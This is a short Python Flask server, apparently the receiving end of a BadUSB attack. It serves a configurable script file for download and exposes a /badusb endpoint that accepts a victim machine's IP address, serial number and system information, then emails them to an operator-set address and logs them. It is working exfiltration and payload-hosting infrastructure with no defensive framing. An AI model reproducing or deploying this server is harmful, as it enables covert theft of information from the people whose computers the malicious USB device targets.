from flask import Flask
from flask import request
import time
import os
import yagmail


user = ""       # eamil
passwd = ""     # 授权码
toEamil = ""    # 发送目标邮箱
scriptName = ""  # 执行文件名
smtphost = ""   # smtp服务器

server = Flask(__name__)


@server.route('/')
def index():
    # return '<h2>Flask Upload Running...</h2>'
    return server.send_static_file('index.html')


@server.route('/' + scriptName)
def sysinfo():
    # return '<h2>Flask Upload Running...</h2>'
    return server.send_static_file(scriptName)


@server.route('/badusb', methods=['POST'])
def badusb():
    ip = 'ip: ' + request.form.get('ip')
    sn = request.form.get('sn')
    info = request.form.get('info').replace('   ', '').split(';')
    mess = ['BadUSB_' + sn, ip, info]
    sendmess(mess)
    return '<h2>Upload Success!</h2>'


def sendmess(mess):
    yag = yagmail.SMTP(user=user, password=passwd, host=smtphost)
    yag.send(toEamil, mess[0], mess[1:])
    with open('log.txt', 'a', encoding='utf8') as log:
        log.write(str(mess)+'\n\n')


if __name__ == "__main__":
    # server.run(host='127.0.0.1', port=12306)
    server.run(host='0.0.0.0', port=12306)
